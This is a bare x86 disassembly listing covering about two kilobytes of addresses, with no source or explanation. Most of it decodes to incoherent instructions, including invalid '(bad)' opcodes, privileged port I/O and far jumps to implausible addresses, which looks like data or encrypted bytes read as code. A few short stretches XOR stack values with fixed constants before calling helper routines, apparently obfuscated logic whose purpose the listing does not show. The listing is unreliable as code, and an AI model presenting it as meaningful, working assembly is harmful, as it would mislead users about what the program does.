  4212cc:	xor    al,0x7c
  4212ce:	sbb    eax,0xf8ed372d
  4212d3:	stos   BYTE PTR es:[edi],al
  4212d4:	aaa    
  4212d5:	push   esp
  4212d6:	inc    ebp
  4212d7:	sub    ecx,esp
  4212d9:	ins    DWORD PTR es:[edi],dx
  4212da:	jo     0x4212bc
  4212dc:	dec    eax
  4212dd:	icebp  
  4212de:	imul   edx,DWORD PTR [ebx+0x48],0xffffffa4
  4212e2:	mov    ebp,0x53c25bcb
  4212e7:	sub    BYTE PTR [ebp+0x16],0xfa
  4212eb:	stc    
  4212ec:	mov    ch,0x4f
  4212ee:	aam    0x20
  4212f0:	mov    esp,0xc7e23978
  4212f5:	jecxz  0x4212ef
  4212f7:	or     al,0x4c
  4212f9:	lds    ecx,FWORD PTR [ebx]
  4212fb:	and    eax,0xc271a137
  421300:	enter  0x8670,0xe
  421304:	add    bl,dh
  421306:	clc    
  421307:	add    eax,0x117cf136
  42130c:	shrd   DWORD PTR [edi-0x46],ebx,0xa2
  421311:	or     DWORD PTR [edi],ebp
  421313:	cdq    
  421314:	jg     0x4212e2
  421316:	cld    
  421317:	mov    bh,0xa5
  421319:	shl    BYTE PTR [edi+0x2405d2c8],cl
  42131f:	jnp    0x4212d7
  421321:	jle    0x4212b6
  421323:	inc    eax
  421324:	ret    0xd0bb
  421327:	add    BYTE PTR [eax],cl
  421329:	sbb    eax,DWORD PTR [ebx]
  42132b:	repz sub ebp,esp
  42132e:	mov    ch,0x5
  421330:	mov    bh,0xf3
  421332:	mov    ch,0x18
  421334:	jae    0x4212eb
  421336:	shl    DWORD PTR [edi],cl
  421338:	pushf  
  421339:	jbe    0x421387
  42133b:	fs (bad) 
  42133d:	fwait
  42133e:	mov    BYTE PTR [esi],0x5e
  421341:	aas    
  421342:	es cmp edx,esp
  421345:	imul   esi,DWORD PTR [ebx+0x607542a3],0x5f
  42134c:	out    0x1e,eax
  42134e:	or     bh,BYTE PTR [esi-0x62]
  421351:	xchg   ecx,eax
  421352:	jmp    0xa23c2379
  421357:	mov    al,0x8a
  421359:	mov    BYTE PTR [edi+0x99de47b],0xcd
  421360:	inc    esi
  421361:	jb     0x4212f6
  421363:	div    BYTE PTR [esi]
  421365:	addr16 pop es
  421367:	sbb    bl,cl
  421369:	mov    al,ds:0xe09932de
  42136e:	and    ecx,edi
  421370:	sub    eax,0x844e349f
  421375:	pop    esp
  421376:	(bad)  
  421377:	cwde   
  421378:	mov    edi,0x3fa87329
  42137d:	lods   eax,DWORD PTR ds:[esi]
  42137e:	pop    edi
  42137f:	dec    esi
  421380:	and    eax,ebx
  421382:	mov    WORD PTR [esi+0x20],es
  421385:	sti    
  421386:	add    DWORD PTR [eax-0x1c8640b0],esi
  42138c:	std    
  42138d:	jns    0xd05f9f57
  421393:	scas   eax,DWORD PTR es:[edi]
  421394:	and    eax,0xf98a503
  421399:	daa    
  42139a:	es popa 
  42139c:	xchg   edx,eax
  42139d:	xchg   esi,esp
  42139f:	mov    dl,0x81
  4213a1:	push   es
  4213a2:	loopne 0x421328
  4213a4:	xchg   ebx,eax
  4213a5:	jle    0x4213ac
  4213a7:	test   ebx,ecx
  4213a9:	in     al,dx
  4213aa:	pop    ds
  4213ab:	dec    ebp
  4213ac:	js     0x42141c
  4213ae:	mov    al,BYTE PTR [eax+0x4cfb3a16]
  4213b4:	mov    ecx,0xadef49eb
  4213b9:	mov    BYTE PTR [edx+ebp*4+0x69a546f7],bh
  4213c0:	lock cmc 
  4213c2:	add    al,0x4d
  4213c4:	aas    
  4213c5:	int    0xed
  4213c7:	cdq    
  4213c8:	rcr    BYTE PTR [ebp+0x63],1
  4213cb:	adc    esp,DWORD PTR [edx]
  4213cd:	stos   DWORD PTR es:[edi],eax
  4213ce:	imul   edx,ebx,0xffffff99
  4213d1:	aad    0xd3
  4213d3:	(bad)  
  4213d5:	mov    ebx,0xa227cbef
  4213da:	and    eax,0xa072f024
  4213df:	dec    edx
  4213e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213e1:	inc    ebp
  4213e2:	push   ebx
  4213e3:	in     eax,dx
  4213e4:	repz aaa 
  4213e6:	pop    ecx
  4213e7:	out    dx,al
  4213e8:	jae    0x4213c0
  4213ea:	out    dx,eax
  4213eb:	dec    esp
  4213ec:	add    al,ch
  4213ee:	les    esi,FWORD PTR [eax]
  4213f0:	sub    ecx,esi
  4213f2:	or     DWORD PTR [eax+0x4a],ecx
  4213f5:	add    ah,BYTE PTR [edi]
  4213f7:	stos   DWORD PTR es:[edi],eax
  4213f8:	mov    esi,0x3abd7a0d
  4213fd:	jne    0x421448
  4213ff:	dec    edx
  421400:	and    esi,ecx
  421402:	sbb    ah,BYTE PTR ds:0xab319510
  421408:	xchg   BYTE PTR [edx+0x73fd46ba],bl
  42140e:	adc    ebx,DWORD PTR [edx+0x34]
  421411:	addr16 mov al,ds:0x6c1a
  421415:	or     eax,0x1de2eef0
  42141a:	jl     0x4213b0
  42141c:	push   ds
  42141d:	cwde   
  42141e:	and    al,0x72
  421420:	push   edx
  421421:	pushf  
  421422:	xor    edx,0x9c2b8ae8
  421428:	mov    cl,0x3e
  42142a:	call   0x4223fa
  42142f:	or     ebx,eax
  421431:	or     esi,edx
  421433:	movzx  eax,bl
  421436:	push   eax
  421437:	lea    eax,[ebp-0x198]
  42143d:	push   eax
  42143e:	call   0x415a09
  421443:	mov    eax,DWORD PTR [ebp-0x1f0]
  421449:	mov    edx,DWORD PTR [ebp-0x1ec]
  42144f:	xor    eax,0xcb79b576
  421454:	xor    edx,0x9c2b8ae8
  42145a:	mov    cl,0x2
  42145c:	call   0x408bb8
  421461:	mov    esi,eax
  421463:	mov    edi,edx
  421465:	mov    eax,DWORD PTR [ebp-0x1f0]
  42146b:	jmp    0x421852
  421470:	out    0xc8,eax
  421472:	push   esi
  421473:	sub    esi,DWORD PTR [esi-0x44]
  421476:	mov    esp,0xfcb5630c
  42147b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42147c:	popf   
  42147d:	push   edi
  42147e:	mov    ss,WORD PTR [eax-0x413f44e1]
  421484:	dec    edx
  421485:	les    edi,FWORD PTR [esi+0xc1297be]
  42148b:	ret    0xbb0
  42148e:	cmc    
  42148f:	sub    edi,DWORD PTR [esi+0x5b527d20]
  421495:	push   esi
  421496:	call   0xf2618a1
  42149b:	pop    ecx
  42149c:	nop
  42149d:	arpl   WORD PTR [eax+eiz*4+0x7d],dx
  4214a1:	lock mov WORD PTR [ebx+0x2490fbb3],ds
  4214a8:	rcr    al,cl
  4214aa:	add    al,BYTE PTR [eax]
  4214ac:	sub    cl,0x9
  4214af:	std    
  4214b0:	xchg   esi,eax
  4214b1:	dec    ebx
  4214b2:	test   BYTE PTR [ebx],cl
  4214b4:	dec    esi
  4214b5:	addr16 push esi
  4214b7:	(bad)  
  4214b8:	(bad)  
  4214b9:	and    eax,esp
  4214bb:	lock sub eax,esp
  4214be:	mov    al,0x2e
  4214c0:	mov    BYTE PTR [eax-0x8],cl
  4214c3:	cmp    BYTE PTR [ebx+0x2485b039],cl
  4214c9:	sti    
  4214ca:	ins    DWORD PTR es:[edi],dx
  4214cb:	sub    eax,0xc2fc7f88
  4214d0:	shl    DWORD PTR [esi-0x750566d1],1
  4214d6:	and    al,0x10
  4214d8:	mov    gs,WORD PTR [ecx]
  4214da:	ret    0x6cd3
  4214dd:	int3   
  4214de:	ins    BYTE PTR es:[edi],dx
  4214df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214e0:	xchg   DWORD PTR [ecx+0x7535ac4f],edx
  4214e6:	sub    esp,eax
  4214e8:	fisttp WORD PTR [ecx+0x7f]
  4214eb:	dec    ebp
  4214ec:	xchg   ebp,eax
  4214ed:	dec    ebp
  4214ee:	mov    dl,0xb8
  4214f0:	fcmovnbe st,st(7)
  4214f2:	or     DWORD PTR [ebx],ecx
  4214f4:	add    esp,ebp
  4214f6:	or     bh,BYTE PTR [edx-0x66]
  4214f9:	sub    bl,BYTE PTR [esi-0x5c]
  4214fc:	enter  0x160d,0x67
  421500:	das    
  421501:	lahf   
  421502:	push   ss
  421503:	pop    ebx
  421504:	push   cs
  421505:	sbb    BYTE PTR [edx+0x4f],0x55
  421509:	lds    edx,FWORD PTR [ecx-0xf5c1fde]
  42150f:	mov    bl,0x48
  421511:	enter  0xb829,0x6f
  421515:	pushf  
  421516:	dec    esi
  421517:	cmp    eax,0x4b3478b7
  42151c:	mov    al,0x2b
  42151e:	mov    edi,0xa8e06681
  421523:	mov    bl,0x6
  421525:	out    dx,al
  421526:	xchg   DWORD PTR [edi-0x57497bd0],esi
  42152c:	enter  0x617a,0xd1
  421530:	sub    DWORD PTR [edi],ebx
  421532:	dec    esi
  421533:	xchg   ebp,eax
  421534:	data16 ja 0x4214d7
  421537:	cli    
  421538:	jns    0x42150a
  42153a:	rol    DWORD PTR [ebp+0x3d02a2a4],cl
  421540:	push   ebp
  421541:	out    0x75,eax
  421543:	cs push es
  421545:	daa    
  421546:	xor    eax,ebp
  421548:	ds inc edi
  42154a:	inc    esp
  42154b:	jae    0x42151c
  42154d:	add    BYTE PTR [ecx],dl
  42154f:	inc    esi
  421550:	dec    edi
  421551:	push   edi
  421552:	cmc    
  421553:	clc    
  421554:	push   cs
  421555:	nop
  421556:	ins    BYTE PTR es:[edi],dx
  421557:	aad    0x1e
  421559:	xor    al,BYTE PTR [eax-0x6b]
  42155c:	jmp    0x421586
  42155e:	xor    BYTE PTR [esi],bh
  421560:	test   eax,0xbe197edd
  421565:	lods   eax,DWORD PTR ds:[esi]
  421566:	outs   dx,BYTE PTR ds:[esi]
  421567:	or     al,0x4a
  421569:	dec    ebx
  42156a:	jge    0x421526
  42156c:	fcmovbe st,st(1)
  42156e:	sbb    eax,0xd80a679b
  421573:	jecxz  0x4215ca
  421575:	sub    esp,edi
  421577:	clc    
  421578:	enter  0xc9a3,0x21
  42157c:	rcr    edx,cl
  42157e:	mov    al,0x61
  421580:	or     dh,BYTE PTR [edi-0x2]
  421583:	push   edi
  421584:	js     0x421569
  421586:	push   ds
  421587:	cmp    esi,DWORD PTR [ebx+0x6e]
  42158a:	pop    edi
  42158b:	or     DWORD PTR [ecx+0x79],ecx
  42158e:	push   ecx
  42158f:	scas   al,BYTE PTR es:[edi]
  421590:	cli    
  421591:	nop
  421592:	jle    0x4215f6
  421594:	mov    ebx,0xb0542bc3
  421599:	pushf  
  42159a:	dec    ebp
  42159b:	clc    
  42159c:	inc    esp
  42159d:	mov    ecx,DWORD PTR [esi-0x77]
  4215a0:	shl    BYTE PTR [ecx+eiz*4-0x2e8726f2],cl
  4215a7:	jb     0x42157f
  4215a9:	push   ss
  4215aa:	mov    al,ds:0x815a644f
  4215af:	cmp    DWORD PTR [eax+0x227f152f],0xc4972710
  4215b9:	and    bl,BYTE PTR [esi+0x7a2e7f07]
  4215bf:	xchg   ebx,eax
  4215c0:	in     eax,0x34
  4215c2:	je     0x4215fd
  4215c4:	enter  0xf53b,0xc9
  4215c8:	mov    eax,0xb7602619
  4215cd:	mov    al,BYTE PTR [ebp-0x24]
  4215d0:	jbe    0x421597
  4215d2:	xor    edx,DWORD PTR [ecx]
  4215d4:	sub    DWORD PTR [ebp-0x3e],edi
  4215d7:	xor    al,0xbd
  4215d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215da:	adc    al,BYTE PTR [esi+0xe98a032]
  4215e0:	jge    0x421605
  4215e2:	and    eax,0x7a45c91e
  4215e7:	mov    esp,0x9d6108e6
  4215ec:	aad    0x14
  4215ee:	aas    
  4215ef:	pop    ebp
  4215f0:	mov    esi,0x692f4361
  4215f5:	mov    ch,0x50
  4215f7:	pop    ds
  4215f8:	icebp  
  4215f9:	ins    BYTE PTR es:[edi],dx
  4215fa:	lahf   
  4215fb:	stos   BYTE PTR es:[edi],al
  4215fc:	test   BYTE PTR [esi+0x4bb3b407],bh
  421602:	xor    al,0x61
  421604:	mov    WORD PTR [eax],?
  421606:	mov    esp,0xb768ee20
  42160b:	mov    ebp,0xc5904af4
  421610:	inc    edi
  421611:	pushf  
  421612:	jmp    0x902c:0x344eca74
  421619:	xor    al,0xe2
  42161b:	pop    ecx
  42161c:	jg     0x4215e3
  42161e:	jns    0x421625
  421620:	retf   
  421621:	or     cl,BYTE PTR [ebp-0x71]
  421624:	mov    ch,0x1
  421626:	mov    al,0xe3
  421628:	mov    edx,0x8cd111a8
  42162d:	(bad)  
  42162e:	sbb    al,BYTE PTR [edi+0x4ee3867]
  421634:	and    ebx,ecx
  421636:	in     eax,0x91
  421638:	retf   0x5d00
  42163b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42163c:	mov    cl,0xf9
  42163e:	neg    DWORD PTR [ebp-0x6b]
  421641:	dec    edx
  421642:	das    
  421643:	(bad)  
  421644:	es repz inc ebx
  421647:	inc    edx
  421648:	adc    al,0x23
  42164a:	lods   eax,DWORD PTR ds:[esi]
  42164b:	sub    cl,BYTE PTR [ecx]
  42164d:	idiv   ecx
  42164f:	outs   dx,BYTE PTR ds:[esi]
  421650:	dec    ecx
  421651:	popa   
  421652:	out    0xae,eax
  421654:	test   al,0x1
  421656:	sub    al,0x1f
  421658:	push   edx
  421659:	arpl   WORD PTR [esi],sp
  42165b:	es mov esi,0xd4bc0ed8
  421661:	dec    edi
  421662:	test   BYTE PTR [ebx-0x75605526],ah
  421668:	adc    al,0xd6
  42166a:	into   
  42166b:	push   ebx
  42166c:	adc    ah,dh
  42166e:	(bad)  
  42166f:	aaa    
  421670:	xor    BYTE PTR [ebp-0x1ef1d708],dl
  421676:	xor    al,0x22
  421678:	clc    
  421679:	inc    esp
  42167a:	fadd   DWORD PTR [ebx+0x7]
  42167d:	cmp    eax,0x11be02c8
  421682:	loope  0x4216da
  421684:	xor    DWORD PTR [esi-0x42],esp
  421687:	adc    dh,BYTE PTR [eax+0x4d]
  42168a:	call   0xef7507c7
  42168f:	loope  0x4216ac
  421691:	cwde   
  421692:	mov    edx,0x8e12619b
  421697:	cwde   
  421698:	jo     0x4216c1
  42169a:	sub    esp,DWORD PTR [ecx-0x3ff8edfe]
  4216a0:	(bad)  
  4216a1:	fwait
  4216a2:	push   ebp
  4216a3:	fmul   DWORD PTR [ebx+0x817b0b]
  4216a9:	imul   esp,ebp,0x64
  4216ac:	pop    esi
  4216ad:	aas    
  4216ae:	push   0x13374d15
  4216b3:	push   esp
  4216b4:	add    al,0xe9
  4216b6:	loop   0x4216ae
  4216b8:	and    al,0x22
  4216ba:	inc    BYTE PTR [ebp-0x43babe83]
  4216c0:	call   0x5d63:0x7a9ea645
  4216c7:	and    eax,0x1be8115
  4216cc:	xor    BYTE PTR [esi-0x7f],dh
  4216cf:	hlt    
  4216d0:	jnp    0x4216f7
  4216d2:	jp     0x42172b
  4216d4:	sbb    eax,0x620d2944
  4216d9:	xchg   esp,eax
  4216da:	mov    edi,esp
  4216dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216dd:	cdq    
  4216de:	and    BYTE PTR [ebp-0x812cd46],bh
  4216e4:	fst    QWORD PTR [eax+0x361d6aed]
  4216ea:	shr    BYTE PTR [edi+0x31],1
  4216ed:	rcr    BYTE PTR [ecx],cl
  4216ef:	loopne 0x42175b
  4216f1:	fbstp  TBYTE PTR [ebx+0x2d7048c]
  4216f7:	push   ds
  4216f8:	inc    ebp
  4216f9:	mov    esi,0xd4122bfb
  4216fe:	xchg   ebp,eax
  4216ff:	retf   0x1f08
  421702:	rcl    ch,0xea
  421705:	xor    eax,0xe3a195c2
  42170a:	das    
  42170b:	stc    
  42170c:	mov    BYTE PTR [esi-0x1fefbee7],ch
  421712:	adc    DWORD PTR [eax],esp
  421714:	cmpnleps xmm5,XMMWORD PTR [eax-0x5acdeb0b]
  42171c:	xor    al,0x34
  42171e:	loop   0x4216e3
  421720:	(bad)  
  421721:	ficomp DWORD PTR [edi-0x713dabe]
  421727:	idiv   esi
  421729:	cmc    
  42172a:	push   0x445365e3
  42172f:	cs (bad) 
  421731:	ds sub dl,dl
  421734:	das    
  421735:	sbb    eax,0x82039050
  42173a:	adc    esi,eax
  42173c:	and    eax,0x6c6a7fd
  421741:	in     eax,0x67
  421743:	jmp    0x217cd849
  421748:	cmp    DWORD PTR [edx-0x3f],ebp
  42174b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42174c:	retf   0xcaaa
  42174f:	xor    BYTE PTR [edx+0xe95f227],al
  421755:	addr16 rcl edx,cl
  421758:	xchg   BYTE PTR [eax-0x6f],dl
  42175b:	pop    DWORD PTR [esi]
  42175d:	aad    0x82
  42175f:	xlat   BYTE PTR ds:[ebx]
  421760:	xchg   esp,eax
  421761:	mov    esi,0x95ab3263
  421766:	adc    esi,ebx
  421768:	xchg   esi,eax
  421769:	and    eax,0xd52a1ae9
  42176e:	push   edi
  42176f:	jge    0x421765
  421771:	gs mov ebp,?
  421774:	cmp    cl,BYTE PTR [esi-0x4f]
  421777:	mov    dh,0x91
  421779:	lds    edx,FWORD PTR [ebx]
  42177b:	sti    
  42177c:	nop
  42177d:	pushf  
  42177e:	arpl   WORD PTR [ebx-0x1e],bx
  421781:	fimul  DWORD PTR [edx]
  421783:	dec    ebx
  421784:	ret    0x2359
  421787:	dec    edi
  421788:	and    DWORD PTR cs:[edx],edi
  42178b:	clc    
  42178c:	adc    bl,0xec
  42178f:	inc    ebx
  421790:	stos   DWORD PTR es:[edi],eax
  421791:	mov    eax,ds:0xc499fa60
  421796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421797:	and    eax,0x2565a66c
  42179c:	push   ecx
  42179d:	or     esp,DWORD PTR [ebp-0x32f468a6]
  4217a3:	jo     0x421785
  4217a5:	jae    0x42174e
  4217a7:	lods   al,BYTE PTR ds:[esi]
  4217a8:	loope  0x4217a6
  4217aa:	adc    edx,DWORD PTR [eax]
  4217ac:	and    eax,0x5e30d909
  4217b1:	shl    BYTE PTR [ecx-0x48],1
  4217b4:	jnp    0x421805
  4217b6:	mul    cl
  4217b8:	or     eax,0x8fb0e79b
  4217bd:	xor    al,0x5c
  4217bf:	pop    eax
  4217c0:	fdiv   QWORD PTR [esi-0x42]
  4217c3:	mov    ecx,0x97c6e804
  4217c8:	repz inc ebx
  4217ca:	in     eax,0x4c
  4217cc:	add    BYTE PTR [esi],dh
  4217ce:	aaa    
  4217cf:	push   ss
  4217d0:	sbb    eax,0x50849693
  4217d5:	sub    edi,DWORD PTR [eax+esi*1-0x65]
  4217d9:	dec    edi
  4217da:	jl     0x42178e
  4217dc:	enter  0x2665,0xf7
  4217e0:	scas   al,BYTE PTR es:[edi]
  4217e1:	xlat   BYTE PTR ds:[ebx]
  4217e2:	mov    al,dl
  4217e4:	and    eax,0x3409f885
  4217e9:	ficom  DWORD PTR [ebx-0xe]
  4217ec:	xor    ebx,ebx
  4217ee:	push   es
  4217ef:	aam    0x35
  4217f1:	ficomp WORD PTR [ebp+0x72]
  4217f4:	push   cs
  4217f5:	dec    ecx
  4217f6:	enter  0x5933,0xca
  4217fa:	stos   BYTE PTR es:[edi],al
  4217fb:	sbb    al,0xf1
  4217fd:	test   eax,0xde88fd7b
  421802:	add    al,0x4f
  421804:	jl     0x4217ae
  421806:	stos   DWORD PTR es:[edi],eax
  421807:	mov    eax,ds:0x122f0030
  42180c:	adc    DWORD PTR [ebx+0x5e],esi
  42180f:	jecxz  0x4217d0
  421811:	out    0x83,eax
  421813:	int    0xfd
  421815:	(bad)  
  421816:	mov    al,0xbd
  421818:	mov    eax,0xa27ff894
  42181d:	pop    ds
  42181e:	mov    eax,DWORD PTR [ecx]
  421820:	ins    BYTE PTR es:[edi],dx
  421821:	pop    esp
  421822:	jle    0x421850
  421824:	arpl   ax,bp
  421826:	call   0x3f83d603
  42182b:	pushf  
  42182c:	outs   dx,BYTE PTR ds:[esi]
  42182d:	mov    esp,0xc0c5b6eb
  421832:	cli    
  421833:	fadd   DWORD PTR [edx+0x24]
  421836:	xor    esp,DWORD PTR [edi]
  421838:	jp     0x42180a
  42183a:	cli    
  42183b:	jmp    0x421878
  42183d:	adc    BYTE PTR [esi+0x7f],ah
  421840:	cmp    ebx,DWORD PTR [esi]
  421842:	or     DWORD PTR [ebx-0x10e47e97],ecx
  421848:	pushf  
  421849:	test   al,0xc2
  42184b:	adc    bl,BYTE PTR [eax+0x67]
  42184e:	int    0x2d
  421850:	cli    
  421851:	aas    
  421852:	mov    edx,DWORD PTR [ebp-0x1ec]
  421858:	xor    eax,0xcb79b576
  42185d:	xor    edx,0x9c2b8ae8
  421863:	mov    cl,0x3e
  421865:	call   0x4223fa
  42186a:	or     esi,eax
  42186c:	or     edi,edx
  42186e:	mov    DWORD PTR [ebp-0x1f8],esi
  421874:	jmp    0x421cb0
  421879:	mov    eax,DWORD PTR [ebp-0x1e0]
  42187f:	mov    edx,DWORD PTR [ebp-0x1dc]
  421885:	xor    eax,0xcb79b576
  42188a:	xor    edx,0x9c2b8ae8
  421890:	mov    cl,0x2
  421892:	call   0x408bb8
  421897:	mov    esi,eax
  421899:	mov    edi,edx
  42189b:	mov    eax,DWORD PTR [ebp-0x1e0]
  4218a1:	mov    edx,DWORD PTR [ebp-0x1dc]
  4218a7:	xor    eax,0xcb79b576
  4218ac:	xor    edx,0x9c2b8ae8
  4218b2:	mov    cl,0x3e
  4218b4:	call   0x4223fa
  4218b9:	or     esi,eax
  4218bb:	or     edi,edx
  4218bd:	jmp    0x421ca4
  4218c2:	sbb    bh,BYTE PTR [esi]
  4218c4:	shr    DWORD PTR [edx+0x6ebaba9a],1
  4218ca:	daa    
  4218cb:	xchg   DWORD PTR [eax-0x2f],ebp
  4218ce:	div    BYTE PTR [edx+edi*4]
  4218d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218d2:	lods   al,BYTE PTR ds:[esi]
  4218d3:	rol    eax,0xbe
  4218d6:	dec    edx
  4218d7:	les    edi,FWORD PTR [esi-0x49608742]
  4218dd:	xchg   ecx,eax
  4218de:	cmc    
  4218df:	hlt    
  4218e0:	or     eax,0x37e358c5
  4218e5:	(bad)  
  4218e6:	add    eax,0xbd907d9a
  4218eb:	and    esp,DWORD PTR [ebx-0x44]
  4218ee:	push   eax
  4218ef:	dec    esi
  4218f0:	test   BYTE PTR ss:[eax+0x52b27945],ch
  4218f7:	in     eax,dx
  4218f8:	push   ebx
  4218f9:	push   ebp
  4218fa:	sub    al,0x5f
  4218fc:	ds jg  0x4218e6
  4218ff:	lds    ecx,FWORD PTR [eax-0x49]
  421902:	pushf  
  421903:	pop    eax
  421904:	inc    ebx
  421905:	dec    edx
  421906:	fld    DWORD PTR [eax-0x7a]
  421909:	cmp    ebp,ebp
  42190b:	fadd   QWORD PTR [esi+0x54]
  42190e:	je     0x421893
  421910:	xor    al,0xe
  421912:	sbb    al,0x83
  421914:	pop    ecx
  421915:	adc    bl,BYTE PTR [ebx+ebx*1-0xb]
  421919:	jg     0x421990
  42191b:	and    ch,ah
  42191d:	stos   BYTE PTR es:[edi],al
  42191e:	cmp    eax,0xcfc444c1
  421923:	bound  ebp,QWORD PTR [eax+0xf]
  421926:	fnstsw WORD PTR [ebx+0x39358c1c]
  42192c:	adc    eax,0xc2df98d3
  421931:	(bad)  
  421933:	test   al,0x65
  421935:	inc    ebp
  421936:	and    BYTE PTR [esi-0x78101bc3],dh
  42193c:	add    al,0x67
  42193e:	adc    BYTE PTR [ecx],bl
  421940:	push   edx
  421941:	push   0x78
  421943:	add    eax,DWORD PTR [eax]
  421945:	or     al,0xc5
  421947:	inc    esp
  421948:	aaa    
  421949:	sub    ebp,DWORD PTR [ebx+0xe]
  42194c:	mov    ds:0x6d3b384f,eax
  421951:	pusha  
  421952:	xchg   ebx,eax
  421953:	icebp  
  421954:	mov    BYTE PTR [esi-0x5c718d3e],bl
  42195a:	adc    BYTE PTR [esi+0x5a393de4],cl
  421960:	xor    dl,dl
  421962:	sub    al,0x9d
  421964:	cli    
  421965:	jno    0x4218ea
  421967:	dec    esi
  421968:	int3   
  421969:	aam    0x23
  42196b:	(bad)  
  42196c:	cmp    al,0xdd
  42196e:	jp     0x42196e
  421970:	fst    st(0)
  421972:	mov    eax,ds:0xfe042777
  421977:	fst    QWORD PTR [esi-0x6c501f0c]
  42197d:	out    0x7,eax
  42197f:	inc    ebx
  421980:	push   0x4737396c
  421985:	cmp    al,0x18
  421987:	jecxz  0x4219c2
  421989:	sub    bh,dh
  42198b:	les    esi,FWORD PTR [edx]
  42198d:	xchg   ebx,eax
  42198e:	mov    ecx,esp
  421990:	cwde   
  421991:	rol    al,cl
  421993:	xchg   edx,eax
  421994:	(bad)
  421997:	sti    
  421998:	push   edi
  421999:	xor    ch,cl
  42199b:	jbe    0x4219e2
  42199d:	aas    
  42199e:	mov    esi,DWORD PTR [eax+0x40f1556c]
  4219a4:	dec    esi
  4219a5:	in     eax,0x61
  4219a7:	retf   0x8a4d
  4219aa:	or     BYTE PTR [ebx*4+0x246ade8b],cl
  4219b1:	sahf   
  4219b2:	retf   
  4219b3:	cmp    al,0x86
  4219b5:	(bad)  
  4219b6:	in     eax,0xdf
  4219b8:	push   es
  4219b9:	arpl   WORD PTR [edi],ax
  4219bb:	adc    ah,dl
  4219bd:	test   BYTE PTR [esi-0x509ffb2d],cl
  4219c3:	xlat   BYTE PTR ds:[ebx]
  4219c4:	in     eax,dx
  4219c5:	jmp    0x42195e
  4219c7:	(bad)  
  4219c8:	(bad)  [esi+eiz*1]
  4219cb:	es (bad) 
  4219cd:	pop    eax
  4219ce:	adc    BYTE PTR [ebx],dl
  4219d0:	int    0x23
  4219d2:	sbb    BYTE PTR [edx+0x1f],0x43
  4219d6:	sbb    ch,BYTE PTR [eax-0x43]
  4219d9:	(bad)  
  4219da:	jecxz  0x4219cf
  4219dc:	imul   esp,DWORD PTR [eax+0x1a],0x92f261b2
  4219e3:	sub    eax,0x4422ae7
  4219e8:	jg     0x42197f
  4219ea:	loop   0x421a18
  4219ec:	jg     0x421a11
  4219ee:	lea    eax,[ebp+ecx*1-0x17]
  4219f2:	cmp    BYTE PTR [ecx],dh
  4219f4:	cmp    eax,0x3f166023
  4219f9:	and    ch,bh
  4219fb:	mov    ch,0x5e
  4219fd:	sub    ch,ah
  4219ff:	push   ds
  421a00:	mov    ds:0xc9ad7c3,eax
  421a05:	cld    
  421a06:	inc    edx
  421a07:	mov    al,BYTE PTR [edi-0x57f87c26]
  421a0d:	mov    esi,0x75e8493
  421a12:	push   ebx
  421a13:	cmp    BYTE PTR [ecx-0x470e6c47],dh
  421a19:	push   esi
  421a1a:	pop    ebx
  421a1b:	jmp    0x2d08:0xc01fa595
  421a22:	test   DWORD PTR [eax],esp
  421a24:	adc    al,0x4
  421a26:	cmc    
  421a27:	sbb    BYTE PTR [esi-0x328e8991],al
  421a2d:	push   cs
  421a2e:	loope  0x421a49
  421a30:	je     0x421a29
  421a32:	add    ebp,DWORD PTR [ecx]
  421a34:	out    dx,eax
  421a35:	les    ebp,FWORD PTR cs:[eax-0x2fd5e6d6]
  421a3c:	jb     0x4219d2
  421a3e:	daa    
  421a3f:	add    edx,ebp
  421a41:	mov    bl,BYTE PTR [esi]
  421a43:	inc    esi
  421a44:	push   ds
  421a45:	push   esp
  421a46:	(bad)  
  421a47:	sub    eax,0x67ab3d19
  421a4c:	scas   al,BYTE PTR es:[edi]
  421a4d:	out    dx,al
  421a4e:	cwde   
  421a4f:	jne    0x421a71
  421a51:	xor    eax,0x43cb29dc
  421a56:	into   
  421a57:	bound  ebx,QWORD PTR ds:0x1ce132c2
  421a5d:	and    ebp,DWORD PTR [esi]
  421a5f:	jmp    0xd156c660
  421a64:	jb     0x421a84
  421a66:	scas   eax,DWORD PTR es:[edi]
  421a67:	push   0x81151c4d
  421a6c:	stos   BYTE PTR es:[edi],al
  421a6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a6e:	aad    0xb8
  421a70:	xchg   ebx,eax
  421a71:	fidiv  WORD PTR ss:[esp+eiz*4-0x367ea05d]
  421a79:	je     0x421a09
  421a7b:	mov    cl,0x36
  421a7d:	add    ch,BYTE PTR [esi-0x4167d5ef]
  421a83:	ss dec ecx
  421a85:	mov    esp,0xc2a4cd70
  421a8a:	xchg   ebp,eax
  421a8b:	jmp    0x6127a96f
  421a90:	inc    edi
  421a91:	call   0x1584ed5b
  421a96:	pop    edx
  421a97:	or     al,0xc2
  421a99:	jmp    0x6d3f:0xcf1f1696
  421aa0:	add    esp,DWORD PTR [ecx]
  421aa2:	sub    DWORD PTR [eax+ebx*1],0x78
  421aa6:	cdq    
  421aa7:	in     al,0x1a
  421aa9:	add    al,0xda
  421aab:	push   ds
  421aac:	and    ecx,DWORD PTR [ecx-0xf]
  421aaf:	out    dx,al
  421ab0:	cdq    
  421ab1:	(bad)  
  421ab2:	mov    al,0x9
  421ab4:	pusha  
  421ab5:	imul   esi,DWORD PTR gs:[edi],0x1b
  421ab9:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  421abb:	cld    
  421abc:	jle    0x421aa5
  421abe:	shl    DWORD PTR ds:0x7abe5acf,0xfd
  421ac5:	push   ebp
  421ac6:	je     0x421ab3
  421ac8:	sub    BYTE PTR [edi],dl
  421aca:	inc    edx
  421acb:	fcmovnbe st,st(5)
  421acd:	xor    al,0x8c
  421acf:	bnd jno 0x421a85
  421ad2:	ss fsubr st,st(1)
  421ad5:	add    cl,0x5
  421ad8:	(bad)  
  421ad9:	push   ss
  421ada:	or     BYTE PTR [ebp-0x19a47da8],bl
  421ae0:	xor    al,0xd8
  421ae2:	adc    bl,cl
